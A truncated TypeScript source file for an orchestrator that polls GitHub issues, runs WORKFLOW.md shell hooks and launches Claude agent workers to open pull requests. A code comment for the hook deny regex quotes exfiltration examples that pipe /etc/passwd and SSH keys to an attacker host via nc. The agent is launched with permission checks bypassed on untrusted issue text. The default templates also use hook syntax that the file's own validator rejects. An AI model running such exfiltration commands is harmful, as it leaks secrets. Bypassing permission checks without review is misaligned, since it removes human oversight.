/**
 * harness.ts — Harness Engineering Orchestrator
 *
 * WORKFLOW.md 기반 자율 이슈→PR 자동화.
 * Go jikime serve 의 Node.js 포팅 (ADK query() 직접 사용).
 *
 * HTTP API:
 *   POST   /api/harness/start              — WORKFLOW.md 로 하네스 시작
 *   DELETE /api/harness/stop?projectPath=  — 하네스 중지
 *   GET    /api/harness/status?projectPath= — JSON 상태 스냅샷
 *   POST   /api/harness/refresh?projectPath= — 즉시 폴 트리거
 *   GET    /api/harness/events?projectPath=  — SSE 오케스트레이터 이벤트
 *   GET    /api/harness/worker-events?projectPath=&issueNumber= — SSE 이슈별 이벤트
 */

import * as fs   from 'fs'
import * as path from 'path'
import * as os   from 'os'
import * as https from 'https'
import { execFile } from 'child_process'
import type { IncomingMessage, ServerResponse } from 'http'
import yaml from 'js-yaml'

// ── Types ─────────────────────────────────────────────────────────

export interface WorkflowConfig {
  tracker: {
    kind: 'github'
    api_key: string
    project_slug: string        // "owner/repo"
    active_states: string[]     // 처리할 라벨 목록
    terminal_states: string[]   // 완료 간주 라벨/상태
  }
  polling:   { interval_ms: number }
  workspace: { root: string }
  hooks: {
    after_create?:  string
    before_run?:    string
    after_run?:     string
    before_remove?: string
    timeout_ms:     number
  }
  agent: {
    max_concurrent_agents: number
    max_turns:             number
    max_retry_backoff_ms:  number
  }
  claude: {
    command:         string
    turn_timeout_ms: number
    stall_timeout_ms: number
  }
  server: { port: number }
  promptTemplate: string   // YAML 프론트매터 이후 Markdown 본문
}

interface HarnessIssue {
  id:          number
  identifier:  string   // "owner/repo#N"
  title:       string
  description: string
  state:       string
  url:         string
  branch_name: string
  attempt:     number
}

interface HarnessWorker {
  issue:         HarnessIssue
  status:        'running' | 'done' | 'error' | 'retrying'
  workspacePath: string
  events:        string[]
  attempt:       number
  nextRetryMs:   number
  sseClients:    Set<ServerResponse>
  interrupt:     (() => Promise<void>) | null
}

interface HarnessOrchestrator {
  projectPath:       string
  workflowPath:      string
  config:            WorkflowConfig
  status:            'running' | 'stopped'
  workers:           Map<number, HarnessWorker>   // key: issue number
  claimed:           Set<number>
  timer:             ReturnType<typeof setInterval> | null
  lastCheck:         string | null
  tokenTotals:       { input: number; output: number; total: number; secondsRunning: number }
  sseClients:        Set<ServerResponse>
  watchHandle:       fs.FSWatcher | null
  consecutiveErrors: number   // pollOnce 연속 실패 카운터 — 지수 백오프용
}

// ── Global Store ──────────────────────────────────────────────────

const orchestrators = new Map<string, HarnessOrchestrator>()

// ── CORS ──────────────────────────────────────────────────────────

const CORS: Record<string, string> = {
  'Access-Control-Allow-Origin':  '*',
  'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
}

// ── WORKFLOW.md Parser ────────────────────────────────────────────

// 5초 TTL 인메모리 캐시 — 매 요청마다 동기 readFileSync 방지
const _wfCache = new Map<string, { config: WorkflowConfig; ts: number }>()
const WF_CACHE_TTL_MS = 5000

export function parseWorkflowMd(filePath: string): WorkflowConfig {
  const cached = _wfCache.get(filePath)
  if (cached && Date.now() - cached.ts < WF_CACHE_TTL_MS) return cached.config

  const raw = fs.readFileSync(filePath, 'utf8')

  // YAML 프론트매터 추출 (--- ... --- 사이)
  const fm = raw.match(/^---\r?\n([\s\S]*?)\r?\n---(?:\r?\n|$)([\s\S]*)$/)
  if (!fm) throw new Error('WORKFLOW.md: YAML 프론트매터(--- ... ---)가 없습니다.')

  const [, yamlStr, promptBody] = fm

  // $VAR → 환경변수 치환 (파싱 전)
  const resolved = yamlStr.replace(/\$([A-Z_][A-Z0-9_]*)/g, (_, name) =>
    process.env[name] ?? `$${name}`,
  )

  const p = yaml.load(resolved) as Record<string, unknown>

  const tracker   = (p.tracker   ?? {}) as Record<string, unknown>
  const polling   = (p.polling   ?? {}) as Record<string, unknown>
  const workspace = (p.workspace ?? {}) as Record<string, unknown>
  const hooks     = (p.hooks     ?? {}) as Record<string, unknown>
  const agent     = (p.agent     ?? {}) as Record<string, unknown>
  const claude    = (p.claude    ?? {}) as Record<string, unknown>
  const server    = (p.server    ?? {}) as Record<string, unknown>

  const slug = tracker.project_slug as string
  if (!slug) throw new Error('WORKFLOW.md: tracker.project_slug 가 필요합니다.')

  // api_key: 없으면 gh auth token 으로 시도
  let apiKey = (tracker.api_key as string | undefined) ?? ''
  if (!apiKey) {
    try {
      // execFileSync: 셸 없이 gh 직접 호출 — 셸 메타문자 인젝션 방지
      const { execFileSync } = require('child_process') as typeof import('child_process')
      apiKey = execFileSync('gh', ['auth', 'token'], {
        encoding: 'utf8', timeout: 3000, stdio: ['ignore', 'pipe', 'ignore'],
      }).trim()
    } catch { /* gh 없으면 빈 문자열 유지 */ }
  }

  const workspaceRoot = ((workspace.root as string) ?? '/tmp/jikime_workspaces')
    .replace(/^~/, os.homedir())
  // workspaceRoot 경계 검증 — WORKFLOW.md 에 ~/../../etc 같은 경로 기재 시 차단
  const normWsRoot    = path.resolve(workspaceRoot)
  const allowedRoots  = [os.homedir(), os.tmpdir(), '/tmp']
  if (!allowedRoots.some(r => normWsRoot === r || normWsRoot.startsWith(r + path.sep))) {
    throw new Error(`workspace.root은 홈 디렉터리 또는 /tmp 내부여야 합니다: ${normWsRoot}`)
  }

  const config: WorkflowConfig = {
    tracker: {
      kind:            'github',
      api_key:         apiKey,
      project_slug:    slug,
      active_states:   (tracker.active_states  as string[]) ?? ['jikime-todo'],
      terminal_states: (tracker.terminal_states as string[]) ?? ['jikime-done', 'Done', 'Closed'],
    },
    polling:   { interval_ms: (polling.interval_ms as number) ?? 15000 },
    workspace: { root: workspaceRoot },
    hooks: {
      after_create:  hooks.after_create  as string | undefined,
      before_run:    hooks.before_run    as string | undefined,
      after_run:     hooks.after_run     as string | undefined,
      before_remove: hooks.before_remove as string | undefined,
      timeout_ms:    (hooks.timeout_ms   as number) ?? 60000,
    },
    agent: {
      max_concurrent_agents: (agent.max_concurrent_agents as number) ?? 3,
      max_turns:             (agent.max_turns             as number) ?? 10,
      max_retry_backoff_ms:  (agent.max_retry_backoff_ms  as number) ?? 300000,
    },
    claude: {
      command:          (claude.command          as string) ?? 'claude',
      turn_timeout_ms:  (claude.turn_timeout_ms  as number) ?? 3600000,
      stall_timeout_ms: (claude.stall_timeout_ms as number) ?? 300000,
    },
    server: { port: (server.port as number) ?? 0 },
    promptTemplate: promptBody.trim(),
  }
  _wfCache.set(filePath, { config, ts: Date.now() })
  return config
}

// ── Template Renderer ─────────────────────────────────────────────

function renderPrompt(template: string, issue: HarnessIssue): string {
  // strict mode: 렌더링 후 미치환 {{ }} 가 남으면 오류
  // \s{0,10} 상한 — \s* 무제한 역추적으로 인한 ReDoS 방지
  const rendered = template
    .replace(/\{\{\s{0,10}issue\.id\s{0,10}\}\}/g,          String(issue.id))
    .replace(/\{\{\s{0,10}issue\.identifier\s{0,10}\}\}/g,  issue.identifier)
    .replace(/\{\{\s{0,10}issue\.title\s{0,10}\}\}/g,       issue.title)
    .replace(/\{\{\s{0,10}issue\.description\s{0,10}\}\}/g, issue.description)
    .replace(/\{\{\s{0,10}issue\.state\s{0,10}\}\}/g,       issue.state)
    .replace(/\{\{\s{0,10}issue\.url\s{0,10}\}\}/g,         issue.url)
    .replace(/\{\{\s{0,10}issue\.branch_name\s{0,10}\}\}/g, issue.branch_name)
    .replace(/\{\{\s{0,10}attempt\s{0,10}\}\}/g,            issue.attempt > 1 ? `Retry attempt ${issue.attempt}` : '')

  const leftover = rendered.match(/\{\{[^}]+\}\}/)
  if (leftover) throw new Error(`WORKFLOW.md 프롬프트에 미정의 변수: ${leftover[0]}`)

  return rendered
}

// ── Workspace Manager ─────────────────────────────────────────────

function sanitizeKey(identifier: string): string {
  return identifier.replace(/[^A-Za-z0-9._-]/g, '_')
}

function getWorkspacePath(config: WorkflowConfig, issue: HarnessIssue): string {
  return path.join(config.workspace.root, sanitizeKey(issue.identifier))
}

// hook 스크립트에서 허용하지 않는 셸 확장 패턴 — $(), ``, 파이프/리다이렉트, 명령 분리자 등
// 단순 명령어 + 경로 인수는 허용, 셸 인젝션 벡터는 차단
// |  — 파이프 (cat /etc/passwd | nc attacker.com)
// >  — 리다이렉트 (cat ~/.ssh/id_rsa > /tmp/leak)
// ;  — 명령 분리자 (command1; command2)
// <( — 프로세스 치환
// \n/\r — 줄바꿈 다중 명령 (git clone repo\ncat ~/.ssh/id_rsa | nc ...)
// $( — 명령 치환  `...` — 백틱 치환  |,> — 파이프/리다이렉트
// && ; <( — 명령 연결 / 프로세스 치환  \r\n — 줄바꿈 멀티커맨드
// ${ $VAR — 파라미터 확장 / 환경변수 참조 ($HOME, ${PATH} 등 경로 탈출 방지)
const HOOK_UNSAFE_RE = /\$[\(\{]|\$[A-Za-z_]|`[^`]*`|\|+|>+|&&|;|<\(|[\r\n]/

function runHook(script: string, cwd: string, timeoutMs: number): Promise<void> {
  if (HOOK_UNSAFE_RE.test(script)) {
    return Promise.reject(new Error(`훅 스크립트에 허용되지 않는 셸 문법이 포함되어 있습니다: ${script.slice(0, 80)}`))
  }
  // execFile 직접 호출 — shell 옵션 제거로 중간 셸 파싱 단계 없음
  // bash -c <script> 형태이므로 HOOK_UNSAFE_RE 통과한 단순 명령만 실행 가능
  return new Promise((resolve, reject) => {
    const proc = execFile('/bin/bash', ['-c', script], { cwd })
    const timer = setTimeout(() => {
      proc.kill()
      reject(new Error(`훅 타임아웃 (${timeoutMs}ms)`))
    }, timeoutMs)

    let stderr = ''
    proc.stderr?.on('data', (d: string) => { stderr += d })

    proc.on('close', (code) => {
      clearTimeout(timer)
      if (code === 0) resolve()
      else reject(new Error(`훅 종료 코드 ${code}: ${stderr.slice(0, 200)}`))
    })
    proc.on('error', (err) => { clearTimeout(timer); reject(err) })
  })
}

async function setupWorkspace(
  config: WorkflowConfig,
  issue: HarnessIssue,
  emit: (msg: string) => void,
): Promise<string> {
  const wsPath = getWorkspacePath(config, issue)
  const isNew  = !fs.existsSync(wsPath)

  if (isNew) {
    fs.mkdirSync(wsPath, { recursive: true })
    emit(`📁 워크스페이스 생성: ${wsPath}`)

    if (config.hooks.after_create) {
      emit('🔧 after_create 훅 실행...')
      await runHook(config.hooks.after_create, wsPath, config.hooks.timeout_ms)
      emit('✅ after_create 완료')
    }
  }

  if (config.hooks.before_run) {
    emit('🔧 before_run 훅 실행...')
    await runHook(config.hooks.before_run, wsPath, config.hooks.timeout_ms)
    emit('✅ before_run 완료')
  }

  return wsPath
}

// ── GitHub API ────────────────────────────────────────────────────

function ghRequest(
  apiPath: string,
  token: string,
  options: { method?: string; body?: unknown } = {},
): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const bodyStr = options.body ? JSON.stringify(options.body) : undefined
    const req = https.request(
      {
        hostname: 'api.github.com',
        path:     apiPath,
        method:   options.method ?? 'GET',
        headers: {
          'User-Agent':            'jikime-harness/1.0',
          Authorization:           `Bearer ${token}`,
          Accept:                  'application/vnd.github+json',
          'X-GitHub-Api-Version':  '2022-11-28',
          'Content-Type':          'application/json',
          ...(bodyStr ? { 'Content-Length': Buffer.byteLength(bodyStr) } : {}),
        },
      },
      (res) => {
        let data = ''
        res.on('data', (c: string) => { data += c })
        res.on('end', () => {
          if ((res.statusCode ?? 0) >= 400) {
            // GitHub API 에러 응답에 토큰이 포함될 경우 마스킹 — 로그/SSE 노출 방지
            const safeData = data.slice(0, 200).replace(/ghp_[A-Za-z0-9]{36}/g, 'ghp_***').replace(/Bearer\s+\S+/gi, 'Bearer ***')
            reject(new Error(`GitHub API ${res.statusCode}: ${safeData}`))
          } else {
            try { resolve(data ? JSON.parse(data) : {}) }
            catch { resolve(data) }
          }
        })
      },
    )
    req.on('error', reject)
    if (bodyStr) req.write(bodyStr)
    req.end()
  })
}

async function fetchActiveIssues(
  owner: string, repo: string,
  token: string, labels: string[],
): Promise<Array<Record<string, unknown>>> {
  const q = encodeURIComponent(labels.join(','))
  return ghRequest(
    `/repos/${owner}/${repo}/issues?state=open&per_page=50&labels=${q}`,
    token,
  ) as Promise<Array<Record<string, unknown>>>
}

// ── Event Broadcast ───────────────────────────────────────────────

function broadcastWorker(worker: HarnessWorker, message: string) {
  const payload = `data: ${JSON.stringify({ type: 'event', message })}\n\n`
  for (const client of worker.sseClients) {
    // 이미 닫힌 클라이언트 정리 — zombie 연결 write 방지
    if (client.destroyed || client.writableEnded) { worker.sseClients.delete(client); continue }
    try {
      const ok = client.write(payload)
      if (!ok) worker.sseClients.delete(client)  // 백프레셔 — 느린 클라이언트 제거
    } catch { worker.sseClients.delete(client) }
  }
}

function broadcastOrch(orch: HarnessOrchestrator, data: Record<string, unknown>) {
  const payload = `data: ${JSON.stringify(data)}\n\n`
  for (const client of orch.sseClients) {
    if (client.destroyed || client.writableEnded) { orch.sseClients.delete(client); continue }
    try {
      const ok = client.write(payload)
      if (!ok) orch.sseClients.delete(client)  // 백프레셔 — 느린 클라이언트 제거
    } catch { orch.sseClients.delete(client) }
  }
}

// ── ADK Runner ────────────────────────────────────────────────────

async function runADK(
  orch: HarnessOrchestrator,
  worker: HarnessWorker,
  wsPath: string,
  prompt: string,
  claudePath: string | undefined,
): Promise<void> {
  const { query } = await import('@anthropic-ai/claude-agent-sdk')
  const isRoot = process.getuid?.() === 0
  const startTime = Date.now()

  const options: Record<string, unknown> = {
    cwd:            wsPath,
    permissionMode: isRoot ? 'acceptEdits' : 'bypassPermissions',
    model:          'claude-sonnet-4-6',
    settingSources: ['user', 'project'],
    ...(!isRoot && { allowDangerouslySkipPermissions: true }),
    ...(claudePath && { pathToClaudeCodeExecutable: claudePath }),
  }

  const qInstance = query({ prompt, options })
  worker.interrupt = qInstance.interrupt?.bind(qInstance) ?? null

  for await (const event of qInstance) {
    if (worker.status !== 'running') break

    const e = event as Record<string, unknown>

    if (e.type === 'assistant') {
      const content = (e.message as { content?: unknown[] } | undefined)?.content ?? []
      for (const block of content as Record<string, unknown>[]) {
        let msg: string | null = null
        if (block.type === 'text' && typeof block.text === 'string') {
          msg = block.text.slice(0, 300)
        } else if (block.type === 'tool_use' && typeof block.name === 'string') {
          const inputJson = block.input ? JSON.stringify(block.input) : '{}'
          msg = `🔧 ${block.name}: ${inputJson}`
        }
        if (msg) {
          worker.events.push(msg)
          // 이벤트 배열 무한 누적 방지 — 최근 500개만 유지
          if (worker.events.length > 500) worker.events = worker.events.slice(-500)
          broadcastWorker(worker, msg)
          broadcastOrch(orch, { type: 'worker_event', issueNumber: worker.issue.id, message: msg })
        }
      }
    }

    // 토큰 집계
    if (e.type === 'result') {
      const usage = (e as Record<string, unknown>).modelUsage as Record<string, Record<string, number>> | undefined
      if (usage) {
        const k = Object.keys(usage)[0]
        if (k) {
          const m = usage[k]
          // m 이 undefined 일 경우 방어 — modelUsage 구조 변경 시 크래시 방지
          if (m) {
            orch.tokenTotals.input  += m.inputTokens  ?? m.cumulativeInputTokens  ?? 0
            orch.tokenTotals.output += m.outputTokens ?? m.cumulativeOutputTokens ?? 0
            orch.tokenTotals.total  = orch.tokenTotals.input + orch.tokenTotals.output
          }
        }
      }
      orch.tokenTotals.secondsRunning += (Date.now() - startTime) / 1000
    }
  }
}

// ── Process Issue (single worker lifecycle) ───────────────────────

async function processIssue(
  orch: HarnessOrchestrator,
  worker: HarnessWorker,
  claudePath: string | undefined,
): Promise<void> {
  const { config } = orch
  const { issue } = worker

  const emit = (msg: string) => {
    worker.events.push(msg)
    broadcastWorker(worker, msg)
    broadcastOrch(orch, { type: 'worker_event', issueNumber: issue.id, message: msg })
  }

  const sendDone = (status: 'done' | 'error') => {
    worker.status = status
    const payload = `data: ${JSON.stringify({ type: 'done', status })}\n\n`
    for (const client of worker.sseClients) {
      try { client.write(payload); client.end() } catch { /* */ }
    }
  }

  try {
    emit(`🚀 이슈 #${issue.id} 처리 시작: ${issue.title} (시도 ${issue.attempt})`)

    // 1. 워크스페이스 준비 (격리된 git clone, 훅 실행)
    const wsPath = await setupWorkspace(config, issue, emit)
    worker.workspacePath = wsPath

    // 2. 프롬프트 렌더링 (WORKFLOW.md 템플릿 변수 치환)
    const prompt = renderPrompt(config.promptTemplate, issue)
    emit(`📝 프롬프트 렌더링 완료 (${prompt.length}자)`)

    // 3. ADK 실행 (격리된 워크스페이스 cwd)
    emit(`🤖 Claude 시작 — cwd: ${wsPath}`)
    await runADK(orch, worker, wsPath, prompt, claudePath)

    // 4. after_run 훅 (실패해도 무시)
    if (config.hooks.after_run) {
      emit('🔧 after_run 훅 실행...')
      await runHook(config.hooks.after_run, wsPath, config.hooks.timeout_ms).catch((err: Error) => {
        emit(`⚠️ after_run 실패 (무시): ${err.message}`)
      })
    }

    emit(`✅ 이슈 #${issue.id} 처리 완료`)
    sendDone('done')
    broadcastOrch(orch, { type: 'issue_done', issueNumber: issue.id, status: 'done', activeCount: activeCount(orch) })

  } catch (err: unknown) {
    const msg = (err as Error).message ?? String(err)
    emit(`❌ 오류: ${msg}`)
    sendDone('error')
    broadcastOrch(orch, { type: 'issue_done', issueNumber: issue.id, status: 'error', message: msg, activeCount: activeCount(orch) })
    throw err   // caller 가 backoff 처리
  } finally {
    orch.claimed.delete(issue.id)
    orch.workers.delete(issue.id)
  }
}

function activeCount(orch: HarnessOrchestrator): number {
  return Array.from(orch.workers.values()).filter(w => w.status === 'running').length
}

// ── Reconcile + Workspace Cleanup ────────────────────────────────

async function reconcileTerminal(
  orch: HarnessOrchestrator,
  openIssueNumbers: Set<number>,
): Promise<void> {
  const { config } = orch

  for (const [num, worker] of orch.workers.entries()) {
    // terminal state 에 도달한 이슈의 워크스페이스 정리
    if (!openIssueNumbers.has(num) && (worker.status === 'done' || worker.status === 'error')) {
      const wsPath = getWorkspacePath(config, worker.issue)
      if (!fs.existsSync(wsPath)) continue

      if (config.hooks.before_remove) {
        await runHook(config.hooks.before_remove, wsPath, config.hooks.timeout_ms).catch(() => {})
      }
      fs.rmSync(wsPath, { recursive: true, force: true })
      console.log(`[harness] workspace removed: ${wsPath}`)
      orch.workers.delete(num)
    }
  }
}

// ── Poll Loop ─────────────────────────────────────────────────────

async function pollOnce(orch: HarnessOrchestrator, claudePath: string | undefined): Promise<void> {
  orch.lastCheck = new Date().toISOString()
  const { config } = orch
  const [owner, repo] = config.tracker.project_slug.split('/')
  const token = config.tracker.api_key

  try {
    const raw = await fetchActiveIssues(owner, repo, token, config.tracker.active_states)
    const openNums = new Set(raw.map(i => i.number as number))

    // 터미널 상태 워크스페이스 정리
    await reconcileTerminal(orch, openNums)

    for (const issue of raw) {
      if (orch.status !== 'running') break

      const num = issue.number as number

      // 이미 처리 중이거나 클레임됨
      if (orch.claimed.has(num)) continue
      const existing = orch.workers.get(num)
      if (existing?.status === 'running') continue

      // 재시도 backoff 대기 중
      if (existing?.status === 'retrying' && Date.now() < existing.nextRetryMs) continue

      // 동시성 제한
      if (activeCount(orch) >= config.agent.max_concurrent_agents) continue

      orch.claimed.add(num)

      const issueData: HarnessIssue = {
        id:          num,
        identifier:  `${owner}/${repo}#${num}`,
        title:       issue.title as string,
        description: (issue.body as string) ?? '',
        state:       ((issue.labels as Array<{ name: string }>)
                        .map(l => l.name)
                        .find(l => config.tracker.active_states.includes(l))) ?? 'open',
        url:         issue.html_url as string,
        branch_name: `fix/issue-${num}`,
        attempt:     (existing?.attempt ?? 0) + 1,
      }

      const worker: HarnessWorker = {
        issue:         issueData,
        status:        'running',
        workspacePath: getWorkspacePath(config, issueData),
        events:        existing?.events ?? [],
        attempt:       issueData.attempt,
        nextRetryMs:   0,
        sseClients:    existing?.sseClients ?? new Set(),
        interrupt:     null,
      }
      orch.workers.set(num, worker)

      broadcastOrch(orch, {
        type:        'issue_found',
        issueNumber: num,
        issueTitle:  issueData.title,
        activeCount: activeCount(orch),
      })

      // 비동기 실행 + 지수 백오프 재시도
      processIssue(orch, worker, claudePath).catch(() => {
        const attempt = worker.attempt
        const backoffMs = Math.min(
          10_000 * Math.pow(2, attempt - 1),
          config.agent.max_retry_backoff_ms,
        )
        const retryWorker: HarnessWorker = {
          ...worker,
          status:      'retrying',
          nextRetryMs: Date.now() + backoffMs,
          interrupt:   null,
        }
        orch.workers.set(num, retryWorker)
        orch.claimed.delete(num)

        broadcastOrch(orch, {
          type:        'retrying',
          issueNumber: num,
          attempt,
          retryAfterMs: backoffMs,
          message:     `재시도 예정: ${Math.round(backoffMs / 1000)}초 후`,
        })
      })
    }

    broadcastOrch(orch, {
      type:        'tick',
      lastCheck:   orch.lastCheck,
      activeCount: activeCount(orch),
    })
    // 성공 시 연속 실패 카운터 리셋
    orch.consecutiveErrors = 0

  } catch (err: unknown) {
    const msg = (err as Error).message
    orch.consecutiveErrors++
    broadcastOrch(orch, { type: 'error', message: msg })
    console.error('[harness] poll error:', msg)

    // 연속 실패 시 지수 백오프 — API 다운 시 tight retry 루프 방지 (최대 5분)
    if (orch.consecutiveErrors > 1 && orch.timer) {
      clearInterval(orch.timer)
      const backoffMs = Math.min(
        orch.config.polling.interval_ms * Math.pow(2, orch.consecutiveErrors - 1),
        5 * 60 * 1000,
      )
      console.warn(`[harness] 연속 ${orch.consecutiveErrors}회 실패 — ${Math.round(backoffMs / 1000)}초 후 재시도`)
      // setTimeout 과 setInterval 이 동일 NodeJS.Timeout 타입이므로 캐스팅 불필요
      orch.timer = setTimeout(() => {
        if (orch.status !== 'running') return
        orch.timer = setInterval(() => pollOnce(orch, claudePath), orch.config.polling.interval_ms)
        pollOnce(orch, claudePath)
      }, backoffMs)
    }
  }
}

// ── Public: Start / Stop ──────────────────────────────────────────

export function startHarness(
  projectPath: string,
  workflowPath: string,
  claudePath: string | undefined,
): HarnessOrchestrator {
  // workflowPath 는 반드시 projectPath 내부여야 함 — 경로 탈출 방지
  const normProject  = path.resolve(projectPath)
  const normWorkflow = path.resolve(workflowPath)
  if (!normWorkflow.startsWith(normProject + path.sep) && normWorkflow !== normProject) {
    throw new Error(`workflowPath must be inside projectPath: ${workflowPath}`)
  }

  stopHarness(projectPath)

  const config = parseWorkflowMd(workflowPath)

  // workspace root 생성
  fs.mkdirSync(config.workspace.root, { recursive: true })

  const orch: HarnessOrchestrator = {
    projectPath,
    workflowPath,
    config,
    status:      'running',
    workers:     new Map(),
    claimed:     new Set(),
    timer:       null,
    lastCheck:   null,
    tokenTotals:       { input: 0, output: 0, total: 0, secondsRunning: 0 },
    sseClients:        new Set(),
    watchHandle:       null,
    consecutiveErrors: 0,
  }

  // WORKFLOW.md 핫리로드
  orch.watchHandle = fs.watch(workflowPath, () => {
    try {
      orch.config = parseWorkflowMd(workflowPath)
      // 폴링 간격 변경 반영
      if (orch.timer) {
        clearInterval(orch.timer)
        orch.timer = setInterval(() => pollOnce(orch, claudePath), orch.config.polling.interval_ms)
      }
      console.log('[harness] WORKFLOW.md 핫리로드 완료')
    } catch (err) {
      console.error('[harness] WORKFLOW.md 리로드 실패:', (err as Error).message)
    }
  })

  const tick = () => pollOnce(orch, claudePath)
  tick()  // 즉시 첫 폴
  orch.timer = setInterval(tick, config.polling.interval_ms)

  orchestrators.set(projectPath, orch)

  console.log(
    `[harness] 시작 — ${config.tracker.project_slug}` +
    ` | 간격 ${config.polling.interval_ms}ms` +
    ` | 최대 동시 ${config.agent.max_concurrent_agents}개` +
    ` | workspace: ${config.workspace.root}`,
  )

  return orch
}

export function stopHarness(projectPath: string): void {
  const orch = orchestrators.get(projectPath)
  if (!orch) return

  orch.status = 'stopped'
  if (orch.timer)       clearInterval(orch.timer)
  if (orch.watchHandle) orch.watchHandle.close()

  for (const worker of orch.workers.values()) {
    worker.interrupt?.().catch(() => {})
  }

  orchestrators.delete(projectPath)
  console.log(`[harness] 중지 — ${projectPath}`)
}

export function getHarness(projectPath: string): HarnessOrchestrator | undefined {
  return orchestrators.get(projectPath)
}

// ── Graceful Shutdown ─────────────────────────────────────────────
// SIGTERM 수신 시 모든 오케스트레이터 정상 종료 — 타이머/watcher 누수 방지
process.once('SIGTERM', () => {
  console.log('[harness] SIGTERM 수신 — 모든 오케스트레이터 종료 중')
  for (const projectPath of [...orchestrators.keys()]) {
    stopHarness(projectPath)
  }
})

// ── Git Remote / JiKiME Detection ────────────────────────────────

function detectGitSlug(projectPath: string): string {
  try {
    // execSync → execFileSync: 셸 미사용으로 인젝션 위험 제거
    const { execFileSync } = require('child_process') as typeof import('child_process')
    const remote = execFileSync('git', ['remote', 'get-url', 'origin'], {
      encoding: 'utf8', cwd: projectPath, timeout: 3000, stdio: ['ignore', 'pipe', 'ignore'],
    }).trim()
    // SSH: git@github.com:owner/repo.git
    const ssh = remote.match(/github\.com[:/]([^/]+\/[^/]+?)(?:\.git)?$/)
    if (ssh) return ssh[1]
    // HTTPS: https://github.com/owner/repo.git
    const https_ = remote.match(/github\.com\/([^/]+\/[^/]+?)(?:\.git)?$/)
    if (https_) return https_[1]
  } catch { /* git 없거나 remote 없음 */ }
  return ''
}

function detectJikiMe(projectPath: string): boolean {
  return fs.existsSync(path.join(projectPath, '.claude'))
}

// ── WORKFLOW.md Templates ─────────────────────────────────────────

interface WorkflowParams {
  slug:          string
  label:         string
  workspaceRoot: string
  port:          number
  maxAgents:     number
}

function workflowTemplateBasic(p: WorkflowParams): string {
  return `---
tracker:
  kind: github
  api_key: $GITHUB_TOKEN
  project_slug: ${p.slug}
  active_states:
    - ${p.label}
  terminal_states:
    - Done
    - Closed

polling:
  interval_ms: 15000

workspace:
  root: ${p.workspaceRoot}

hooks:
  after_create: |
    git clone https://github.com/${p.slug} .
    npm install 2>/dev/null || yarn 2>/dev/null || true
  before_run: |
    git fetch origin && git status
  after_run: |
    echo "Agent finished for {{ issue.identifier }}"
  timeout_ms: 60000

agent:
  max_concurrent_agents: ${p.maxAgents}
  max_turns: 10
  max_retry_backoff_ms: 300000

claude:
  command: claude
  turn_timeout_ms: 3600000
  stall_timeout_ms: 300000

server:
  port: ${p.port}
---

You are an autonomous software engineer assigned to fix a GitHub issue.

## Issue

- **ID**: {{ issue.identifier }}
- **Title**: {{ issue.title }}
- **State**: {{ issue.state }}
- **URL**: {{ issue.url }}

## Description

{{ issue.description }}

## Instructions

1. Analyze the issue carefully before making any changes.
2. Make minimal, focused changes to resolve the issue.
3. Follow existing code patterns and conventions.
4. Write tests for any new functionality.
5. Create a pull request when done:
\`\`\`bash
gh pr create --title "Fix: {{ issue.title }}" --body "Closes {{ issue.url }}"
\`\`\`

{{ attempt }}
`
}

function workflowTemplateJikiMe(p: WorkflowParams): string {
  return `---
tracker:
  kind: github
  api_key: $GITHUB_TOKEN
  project_slug: ${p.slug}
  active_states:
    - ${p.label}
  terminal_states:
    - Done
    - Closed

polling:
  interval_ms: 15000

workspace:
  root: ${p.workspaceRoot}

hooks:
  after_create: |
    git clone https://github.com/${p.slug} .
    npm install 2>/dev/null || yarn 2>/dev/null || true
  before_run: |
    git fetch origin && git status
  after_run: |
    echo "Agent finished for {{ issue.identifier }}"
  timeout_ms: 60000

agent:
  max_concurrent_agents: ${p.maxAgents}
  max_turns: 20
  max_retry_backoff_ms: 300000

claude:
  command: claude
  turn_timeout_ms: 3600000
  stall_timeout_ms: 300000

server:
  port: ${p.port}
---

You are J.A.R.V.I.S. — the JikiME-ADK Development Orchestrator.
You are assigned to autonomously resolve a GitHub issue using the full JikiME-ADK agent stack.

## Issue

- **ID**: {{ issue.identifier }}
- **Title**: {{ issue.title }}
- **State**: {{ issue.state }}
- **URL**: {{ issue.url }}

## Description

{{ issue.description }}

## Execution Protocol

Follow the JikiME-ADK /jikime:2-run workflow:

### Phase 1: Analyze
Use the Explore subagent to deeply understand the codebase:
- Read all relevant files and understand existing patterns
- Identify the root cause of the issue
- Map the exact files that need to be changed

### Phase 2: Plan
Use the manager-spec subagent to create a minimal implementation plan.

### Phase 3: Implement
Delegate to appropriate specialist subagents (backend/frontend):
- Make minimal, focused changes
- Follow existing code patterns and CLAUDE.md conventions
- Ensure backward compatibility

### Phase 4: Verify
Use the manager-quality subagent (TRUST 5 validation):
- Run existing tests, add tests for new functionality
- Check for regressions

### Phase 5: Submit
\`\`\`bash
gh pr create --title "Fix: {{ issue.title }}" --body "Closes {{ issue.url }}"
\`\`\`

{{ attempt }}
`
}

// ── HTTP Route Helpers ────────────────────────────────────────────

// projectPath 쿼리 파라미터 검증 — 경로 순회 및 빈 값 방지
function validateProjectPathParam(rawPath: string): string | null {
  if (!rawPath) return null
  const norm = path.resolve(rawPath)
  // '..' 잔존 검사 (resolve 후에는 사라져야 함) + 절대 경로 요구
  if (!path.isAbsolute(norm)) return null
  return norm
}

// owner/repo 형식 슬러그 검증
const SLUG_RE = /^[a-zA-Z0-9_.-]+\/[a-zA-Z0-9_.-]+$/

// ── HTTP Route Handler (server.ts 에서 등록) ──────────────────────

export function handleHarnessRoutes(
  req:       IncomingMessage,
  res:       ServerResponse,
  pathname:  string,
  claudePath: string | undefined,
): boolean {
  if (!pathname.startsWith('/api/harness')) return false

  // ── POST /api/harness/start ─────────────────────────────────────
  if (pathname === '/api/harness/start' && req.method === 'POST') {
    req.setTimeout(30_000, () => { req.destroy() })
    const MAX_START_BODY = 100 * 1024  // 100 KB
    let body = ''
    let bodySize = 0
    req.on('data', (c: Buffer) => {
      bodySize += c.length
      if (bodySize > MAX_START_BODY) { req.destroy(); return }
      body += c
    })
    req.on('end', () => {
      if (bodySize > MAX_START_BODY) {
        res.writeHead(413, CORS); res.end(JSON.stringify({ error: 'Request body too large' })); return
      }
      try {
        const { projectPath } = JSON.parse(body) as { projectPath: string }
        if (!projectPath) {
          res.writeHead(400, CORS); res.end(JSON.stringify({ error: 'projectPath required' })); return
        }
        const workflowPath = path.join(projectPath, 'WORKFLOW.md')
        if (!fs.existsSync(workflowPath)) {
          res.writeHead(404, CORS)
